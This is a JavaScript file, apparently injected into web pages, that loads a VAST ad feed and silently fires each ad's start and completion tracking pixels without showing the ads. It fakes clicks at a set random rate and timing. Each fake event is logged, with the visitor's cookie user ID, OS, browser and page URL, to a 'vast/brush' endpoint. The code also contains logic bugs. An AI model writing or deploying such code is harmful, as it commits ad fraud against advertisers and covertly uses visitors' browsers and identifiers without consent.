(function () {
	try {


	var vast_url_01 = 'http://delivery.maihehd.com/d/vast/3.0?pos=100';
	var complete1 = new Array();//广告完成链接数组
	var click1 = new Array();//广告点击链接数组
	var start1 = new Array();//广告开始连接数组
	var ads1 = new Array();
	var adId1;
	var duration1;
	var odds1 =0.98; //点击率  （1-odds）;

	$(document).ready(function(){

		var xmlHttpReqReq = getXmlHttpRequest();
		ads1 = parseXML(vast_url_01,xmlHttpReqReq);

		if(ads1.length>0){
			loopAd1(ads1,0,odds1);
		}

	});

//创建XMLHttpRequest对象
	function getXmlHttpRequest(){
		var xmlHttpReqReq;
		if(window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
			xmlHttpReqReq = new XMLHttpRequest();
			//针对某些特定版本的mozillar浏览器的bug进行修正。
			if (xmlHttpReqReq.overrideMimeType) {
				xmlHttpReqReq.overrideMimeType('text/xml');
			};
		} else {// code for IE6, IE5
			xmlHttpReqReq = new ActiveXObject("Microsoft.xmlHttpReq");
		}
		return xmlHttpReqReq;
	}


//解析vast 获取访问链接，返回数组对象
	function parseXML(vast_url,xmlHttpReqReq){
		var xmlDoc;
		var ele_ad;
		var adArr = new Array();

		xmlHttpReqReq.open("GET",vast_url,false);
		xmlHttpReqReq.send();
		xmlDoc=xmlHttpReqReq.responseXML;

		//删除Extensions节点， Extensions节点下的Ad不需要获取
		var extensions = xmlDoc.getElementsByTagName("Extensions");
		if(extensions.length > 0 ){
			for(var i = 0;i<extensions.length;i++){
				extensions[i].parentNode.removeChild(extensions[i]);
			}
		}
		//console.log(xmlDoc);
		//获取Ad节点
		ele_ad = xmlDoc.getElementsByTagName('Ad');

		if(ele_ad!=null && ele_ad.length>0){
			for(var i=0;i<ele_ad.length;i++){
				var ad_option = {};

				//获取Ad id
				var id_str = ele_ad[i].getAttribute('id');
				ad_option['id']=id_str;

				var ad_inline = ele_ad[i].getElementsByTagName('InLine');
				if(ad_inline != null){
					var inline_creatives = ad_inline[0].getElementsByTagName('Creatives');
					if(inline_creatives !=null){
						var creatives_creative =  inline_creatives[0].getElementsByTagName('Creative');
						if(creatives_creative!=null){
							var creative_linear = creatives_creative[0].getElementsByTagName('Linear');
							if(creative_linear!=null){
								var linear_duration = creative_linear[0].getElementsByTagName('Duration');
								var linear_trackingevents = creative_linear[0].getElementsByTagName('TrackingEvents');
								var linear_videoclicks = creative_linear[0].getElementsByTagName('VideoClicks');
								// 获取广告持续时间
								if(linear_duration!=null){
									var duration = linear_duration[0]
									ad_option['duration'] = duration.innerHTML;
								}

								//获取广告开始和结束时访问的连接地址
								if(linear_trackingevents!=null){
									var trackingevents_tracking = linear_trackingevents[0].getElementsByTagName('Tracking');
									if(trackingevents_tracking!=null){
										var startObj = new Array();
										var completeObj = new Array();
										var s_idx =0;
										var c_idx =0;
										for(var j=0;j<trackingevents_tracking.length;j++){
											var tracking = trackingevents_tracking[j];
											var tracking_attr = tracking.getAttribute('event');

											var tracking_inner = tracking.innerHTML;
											tracking_inner = tracking_inner.replace('<![CDATA[','').replace(']]>','');

											if(tracking_attr=='start'){
												startObj[s_idx] =tracking_inner;
												s_idx++;
											}else if(tracking_attr ='complete'){
												completeObj[c_idx] =tracking_inner;
												c_idx++;
											}
										}
										ad_option['start'] =startObj;
										ad_option['complete'] = completeObj;
									}
								}
								//获取广告点击时访问的链接地址
								if(linear_videoclicks!=null){
									videoclicks_clicktracking = linear_videoclicks[0].getElementsByTagName('ClickTracking');
									if(videoclicks_clicktracking!=null){
										var clicktracking = videoclicks_clicktracking[0].innerHTML;
										clicktracking = clicktracking.replace('<![CDATA[','').replace(']]>','');
										var clickObj = new Array();
										clickObj[0] = clicktracking
										ad_option['click'] = clickObj;
									}
								}

							}
						}
					}
				}
				adArr[i] = ad_option;
			}
		}
		return adArr;
	}


	function getAjax(type,urlObj,adId,vast_url,duration){
		if(urlObj.length>0){
			for(var i=0;i<urlObj.length;i++){
				var url = urlObj[i];
				var num = i;
				geturl(type,num,url,adId,vast_url,duration);
			}
		}
	}


	function geturl(type,num,url,adId,vast_url,duration){
		$.ajax({
			type : 'GET',
			url : url,
			error: function(msg) {  // 请求失败
				//console.log('>>>>>>>>>>>>>>>>>>>>>>>>>'+type+num+':fail');
				putlog(vast_url,type,url,adId,'fail',duration);
			} ,
			success : function(msg) {
				//console.log('>>>>>>>>>>>>>>>>>>>>>>>>>'+type+num+':'+msg);
				putlog(vast_url,type,url,adId,'success',duration);
			}
		});
	}

//递归请求Ad adArr:广告数组；idx：ad计数；odds:点击几率
	function loopAd1(adArr,idx1,odds){
		if(idx1<adArr.length){
			var ad = adArr[idx1];
			var time = ad.duration;
			start1 = ad.start;
			complete1 = ad.complete;
			click1 = ad.click;
			adId1=ad.id;
			duration1 = time;
			var timeArr = time.split(':');
			var sec = parseInt(timeArr[0])*60*60 +parseInt(timeArr[1])*60 + parseInt(timeArr[2]);
			if(sec==0){
				sec = 15;
			}
			var randNum = parseInt(1+Math.random()*sec);
			var randClk = Math.random();
			getAjax('start',start1,adId1,vast_url_01,duration1);//广告开始播放，多个Tracking start要一起执行。

			if(randClk>=odds){
				setTimeout(function () {
					getAjax('click',click1,adId1,vast_url_01,duration1);
				},1000*randNum);//请求点击广告的链接
			}else{
				//console.log('>>>>>>>>>>>>>>>>>>>>>>>>>noClick');
			}
			//广告播放完成 请求广告播放完成链接
			setTimeout(function(){
				getAjax('complete',complete1,adId1,vast_url_01,duration1);
			},sec*1000);
			setTimeout(function(){
					loopAd1(ads1,'+(idx1+1)+',odds1);
				},sec*1000);
		}
	}

//获取客户端操作系统类型
	function detectOS() {
		var sUserAgent = navigator.userAgent;
		var isWin = (navigator.platform === "Win32") || (navigator.platform === "Windows");
		var isMac = (navigator.platform === "Mac68K") || (navigator.platform === "MacPPC") || (navigator.platform === "Macintosh") || (navigator.platform === "MacIntel");
		var bIsIpad = sUserAgent.match(/ipad/i) === "ipad";
		var bIsIphoneOs = sUserAgent.match(/iphone os/i) === "iphone os";
		var isUnix = (navigator.platform === "X11") && !isWin && !isMac;
		var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
		var bIsAndroid = sUserAgent.toLowerCase().match(/android/i) === "android";
		var bIsCE = sUserAgent.match(/windows ce/i) === "windows ce";
		var bIsWM = sUserAgent.match(/windows mobile/i) === "windows mobile";
		if (isMac) return "Mac";
		if (isUnix) return "Unix";
		if (isLinux) {
			if (bIsAndroid) {
				return "Android";
			} else {
				return "Linux";
			}
		}
		if (bIsCE || bIsWM) {
			return 'wm';
		}
		if (isWin) {
			var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
			if (isWin2K) return "Win2000";
			var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1;
			if (isWinXP) return "WinXP";
			var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1;
			if (isWin2003) return "Win2003";
			var isWinVista = sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1;
			if (isWinVista) return "WinVista";
			var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1;
			if (isWin7) return "Win7";
			var isWin8 = sUserAgent.indexOf("Windows NT 6.2") > -1 || sUserAgent.indexOf("Windows 8") > -1;
			if (isWin8) return "Win8";
		}
		return "other";
	}

//判断浏览器
	function explorerType(){
		var brow=$.browser;
		var bInfo="非主流浏览器";
		if(brow.msie){
			bInfo="MicrosoftInternetExplorer"+brow.version;
		}
		if(brow.mozilla){
			bInfo="MozillaFirefox"+brow.version;
		}
		if(brow.safari){
			bInfo="AppleSafari"+brow.version;
		}
		if(brow.opera){
			bInfo="Opera"+brow.version;
		}
		if(brow.chrome){
			bInfo="chrome"+brow.version;
		}
		return bInfo;
	}

//记录日志
	function putlog(vast_url,excutType,excutUrl,excutAdid,result,duration){
		/*excutType:start,click,complete*/
		var qid = coo_name;
		var uid = $.parseJSON($.cookie('mylist')).uid;
		var os_type = detectOS();
		var browser_type = explorerType();
		var current_url=window.location.href;

		var idx = current_url.indexOf('?');
		if(idx>0){
			current_url=current_url.substring(0,idx);
		}

		var log_str = qid+'\t'+uid+'\t'+os_type+'\t'+browser_type+'\t'+current_url+'\t'+vast_url+'\t'+excutAdid+'\t'+excutType+'\t'+excutUrl+'\t'+result+'\t'+duration+'\t'+'pc';
		//console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>log:::::'+log_str);

		$.ajax({
			type : 'POST',
			url: 'http://vastlog.dftoutiao.com/vast/brush',
			dataType : 'jsonp',
			data : {
				"param" : log_str
			},
			jsonp : 'jsonpcallback',
			success : function(msg) {
				//console.log(msg);
			}
		});
	}
	}catch (e){}
})();




